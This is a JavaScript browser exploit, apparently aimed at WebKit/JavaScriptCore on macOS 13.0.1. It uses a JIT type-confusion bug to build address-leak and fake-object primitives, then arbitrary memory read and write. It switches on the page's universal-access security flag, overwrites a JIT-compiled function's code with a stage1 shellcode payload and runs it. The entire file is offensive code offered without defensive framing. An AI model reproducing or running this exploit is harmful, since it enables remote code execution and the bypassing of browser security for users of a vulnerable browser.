class Base extends Function {
    constructor() {
        super();
        super.prototype = 1;
    }
}

var structs = [];
for (var i = 0; i < 0x1000; i++) {
    var a = new Float64Array(1);
    a['prop' + i] = 1337;
    structs.push(a);
}

for (var i = 0; i < 0x1000; i++) {
    var a = new Float64Array(1);
    a['prop' + i] = 1337;
    structs.push(a);
}

for (var i = 0; i < 0x1000; i++) {
    var a = new Float64Array(1);
    a['prop' + i] = 1337;
    structs.push(a);
}


// address leak
function addrofOnce(obj){
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[0] = 1.1;
    let trigger = false;
    const b = new Base();

    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = obj; return false;} });

    function jitme(a, flag) {
        a[0] = 1.1; 
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        return a[1];
    }
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false); // JITting...
    }
    trigger = true;
    arr[0] = b.prototype;
    let addr = Int64.fromDouble(jitme(confuse, true));
    return addr;
}


function fakeobjOnce(addr){
    addr = Number(addr);
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[1] = 1.1;
    let trigger = 0;
    const b2 = new Base();

    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b2.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = {}; return false; } });

    function jitme(a, flag, f64arr, u32arr) {
        a[0] = 1.1; 
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        f64arr[0] = f64arr[1] = a[1];
        // u32arr[3] = 1; //temp
        // if(flag)
        //     debug(u32[3])
        u32arr[2] = addr;
        a[1] = f64arr[1];
    }

    let u32arr = new Uint32Array(4);
    let f64arr = new Float64Array(u32arr.buffer);
    
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false, f64arr, u32arr); // JITting...
    }

    trigger = 1;
    arr[0] = b2.prototype;
    jitme(confuse, true, f64arr, u32arr);
    return confuse[1];
}

function addrofOnce2(obj){
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[0] = 1.1;
    let trigger = false;
    const b = new Base();

    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = obj; return false;} });

    function jitme(a, flag) {
        a[0] = 1.1; 
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        return a[1];
    }
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false); // JITting...
    }
    trigger = true;
    arr[0] = b.prototype;
    let addr = Int64.fromDouble(jitme(confuse, true));
    return addr;
}


function fakeobjOnce2(addr){
    addr = Number(addr);
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[1] = 1.1;
    let trigger = 0;
    const b2 = new Base();

    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b2.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = {}; return false; } });

    function jitme(a, flag, f64arr, u32arr) {
        a[0] = 1.1; 
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        f64arr[0] = f64arr[1] = a[1];
        // u32arr[3] = 1; //temp
        // if(flag)
        //     debug(u32[3])
        u32arr[2] = addr;
        a[1] = f64arr[1];
    }

    let u32arr = new Uint32Array(4);
    let f64arr = new Float64Array(u32arr.buffer);
    
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false, f64arr, u32arr); // JITting...
    }

    trigger = 1;
    arr[0] = b2.prototype;
    jitme(confuse, true, f64arr, u32arr);
    return confuse[1];
}

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);

function f2i(val) { 
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val) {
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

function i2obj(val) {
    return i2f(val-0x02000000000000);
}

function LeakStructureID(obj) {
    let container = {
        cellHeader: i2obj(0x0108200700000000),
        butterfly: obj
    };
    let fakeObjAddr = (Add(addrofOnce(container), 0x10)); // 16
    let fakeObj = fakeobjOnce(fakeObjAddr);
    f64[0] = fakeObj[0];
    let structureID = u32[0];
    u32[1] = 0x01082307 - 0x20000;
    container.cellHeader = f64[0];
    return structureID;
}

function MakeJitCompiledFunction() {
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}

function millis(ms)
{
	var t1 = Date.now();
    while(Date.now() - t1 < ms)
    {
    	//Simply wait
    }
}

var shellcodeFunc = MakeJitCompiledFunction();

function pwn() {

    let noCoW = 13.37;
    var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
    let structureID = LeakStructureID(arrLeak);
    log("[+] leak structureID: "+(structureID));

    pad = [{}, {}, {}];
    var victim = [noCoW, 14.47, 15.57];
    victim['prop'] = 13.37;
    victim['prop_1'] = 13.37;

    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;

    var container = {
        cellHeader: f64[0],
        butterfly: victim   
    };

    // build fake driver
    var containerAddr = addrofOnce2(container);
    var fakeArrAddr = Add(containerAddr, 0x10); // 16//containerAddr + 0x10;
    var driver = fakeobjOnce2(fakeArrAddr);

    // ArrayWithDouble
    var unboxed = [noCoW, 13.37, 13.37];
    // ArrayWithContiguous
    var boxed = [{}];

    // leak unboxed butterfly's addr
    driver[1] = unboxed;
    var sharedButterfly = victim[1];
    log("[+] shared butterfly addr: " + Int64.fromDouble(sharedButterfly));

    driver[1] = boxed;
    victim[1] = sharedButterfly;

    // set driver's cell header to double array
    u32[0] = structureID;
    u32[1] = 0x01082307-0x20000;
    container.cellHeader = f64[0];

    function addrof(obj) {
        boxed[0] = obj;
        return f2i(unboxed[0]);
    }
    
    function fakeobj(addr) {
        unboxed[0] = i2f(addr);
        return boxed[0];            
    }    

    function read64(addr) {
        driver[1] = i2f(addr+0x10);
        return addrof(victim.prop);
    }
    
    function write64(addr, val) {
        driver[1] = i2f(addr+0x10);
        victim.prop = i2f(val);
    }

    function ByteToDwordArray(payload)
    {
        let sc = []
        let tmp = 0;
        let len = Math.ceil(payload.length/6)
        for (let i = 0; i < len; i += 1) {
            tmp = 0;
            pow = 1;
            for(let j=0; j<6; j++){
                let c = payload[i*6+j]
                if(c === undefined) {
                    c = 0;
                }
                pow = j==0 ? 1 : 256 * pow;
                tmp += c * pow;
            }
            tmp += 0xc000000000000;
            sc.push(tmp);
        }
        return sc;
    }

    function ArbitraryWrite(addr, payload) 
    {
        let sc = ByteToDwordArray(payload);
        for(let i=0; i<sc.length; i++) {
            write64(addr+i*6, sc[i]);
        }
    }

    const toHex = (num, padding = 0, uppercase = false) => 
        `0x${num.toString(16).padStart(padding, '0')}${uppercase ? '' : ''}`.toUpperCase();

    //let the fun begin!
    let myOBJ = {a: 0x1337};
    let myOBJAddr = addrof(myOBJ);
    log(`[*] myOBJAddr = ${(myOBJAddr).toString(16)}`); 

    let fakeOBJ = fakeobj(myOBJAddr);
    log(`[*] fakeOBJ = ${(fakeOBJ.a).toString(16)}`); 

    let myOBJ2 = {b: 0x4141};
    let myOBJAddr2 = addrof(myOBJ2);
    log(`[*] myOBJAddr2 = ${(myOBJAddr2).toString(16)}`); 

    let fakeOBJ2 = fakeobj(myOBJAddr2);
    log(`[*] fakeOBJ2 = ${(fakeOBJ2.b).toString(16)}`); 
 
    var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
    var FPO = spectre ? 0x18 : 0x10; 
    log(`[*] FPO = ${FPO.toString(16)}`);
    
    var wrapper = document.createElement('div');
    var wrapper_addr = addrof(wrapper);
    log(`[*] wrapper_addr = ${(wrapper_addr).toString(16)}`); 
    var el_addr = read64(wrapper_addr + FPO);
    log(`[*] el_addr = ${(el_addr).toString(16)}`); 
    var vtab_addr = read64(el_addr);
    log(`[*] vtab_addr = ${(vtab_addr).toString(16)}`); 

    //macOS 13.0.1 (x86_64)
    var JSXMLHttpRequest = new XMLHttpRequest();
    var JSXMLHttpRequest_ptr = addrof(JSXMLHttpRequest);
    log("[*] JSXMLHttpRequest @ " + JSXMLHttpRequest_ptr.toString(16));

    var XMLHttpRequest_ptr = read64(JSXMLHttpRequest_ptr + 0x18) - 0x28;
    log("[*] XMLHttpRequest @ " + XMLHttpRequest_ptr.toString(16));

    var ScriptExecutionContext_ptr = read64(XMLHttpRequest_ptr + 0x8);
    log("[*] ScriptExecutionContext @ " + ScriptExecutionContext_ptr.toString(16));

    var SecurityOriginPolicy_ptr = read64(ScriptExecutionContext_ptr + 0x8);
    log("[*] SecurityOriginPolicy @ " + SecurityOriginPolicy_ptr.toString(16));

    var SecurityOrigin_ptr = read64(SecurityOriginPolicy_ptr + 0x8);
    log("[*] SecurityOrigin @ " + SecurityOrigin_ptr.toString(16));

    var SecurityOrigin_flags = read64(SecurityOrigin_ptr + 0x40);
    log(`[*] SecurityOrigin->m_universalAccess @ ${SecurityOrigin_flags.toString(16)}`);

    var new_flags = SecurityOrigin_flags + 1;
    write64(SecurityOrigin_ptr + 0x40, new_flags);
    var SecurityOrigin_flags2 = read64(SecurityOrigin_ptr + 0x40);
    log(`[*] Modified SecurityOrigin->m_universalAccess @ ${SecurityOrigin_flags2.toString(16)}`);


    
    var webcore_base = vtab_addr - 0x250c87d;
    log(`[*] webcore base @ ${(webcore_base).toString(16)}`); 
    var read_webcore = read64(webcore_base);
    log(`[*] webcore read test @ ${read_webcore.toString(16)}`);

    var shellcodeFuncAddr = addrof(shellcodeFunc);
    log(`[*] Shellcode function @ ${shellcodeFuncAddr.toString(16)}`);

    var executableAddr = read64(shellcodeFuncAddr + 24);
    log(`[*] Executable instance @ ${executableAddr.toString(16)}`);

    var jitCodeAddr = read64(executableAddr + 8);
    log(`[*] JITCode instance @ ${jitCodeAddr.toString(16)}`);

    var JITCode = read64(jitCodeAddr + 0x1a0);
    log(`[*] JITCode @ ${JITCode.toString(16)}`);

    stage1.replace(new Int64("0x4141414141414141"), new Int64(webcore_base));

    ArbitraryWrite(JITCode, stage1);

    log('[*] Executed stage1.bin!');

    shellcodeFunc();

    log("[*] Done!");
}
